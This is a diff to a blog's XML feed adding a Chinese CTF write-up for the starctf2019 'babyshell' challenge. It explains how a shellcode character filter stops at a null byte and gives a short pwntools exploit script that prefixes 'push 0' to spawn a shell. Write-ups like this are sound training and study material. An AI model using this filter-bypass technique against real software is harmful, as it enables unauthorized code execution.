@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>starctf2019-babyshell</title>
+      <link href="/2019/05/05/starctf2019-babyshell/"/>
+      <url>/2019/05/05/starctf2019-babyshell/</url>
+      
+        <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>starctf2019的一道题，出题人想出的有点挑战，奈何代码出现了失误，很容易就被绕过了。</p><a id="more"></a><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>程序很简单，读入shellcode，做检查，check过了就执行shellcode。</p><p>这个检查规定了你的shellcode必须为指定的字符，但是检查到’\x00’就停止检查，所以很容易被绕过。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">check</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *j; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = a1; *i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = table; *j &amp;&amp; *j != *i; ++j )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( !*j )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>我们需要产生一个’\x00’来绕过检查，很容易想到的就是push 0，或者pop 0。而push 0正好是’j\x00’，而’j’在允许的table表中，所以在shellcode前面加上push 0即可。</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./shellcode'</span>)</span><br><span class="line"></span><br><span class="line">p.send(asm(<span class="string">'push 0'</span>) + asm(shellcraft.amd64.sh(),arch=<span class="string">'amd64'</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>starctf2019-girlfriend</title>
       <link href="/2019/05/05/starctf2019-girlfriend/"/>
       <url>/2019/05/05/starctf2019-girlfriend/</url>
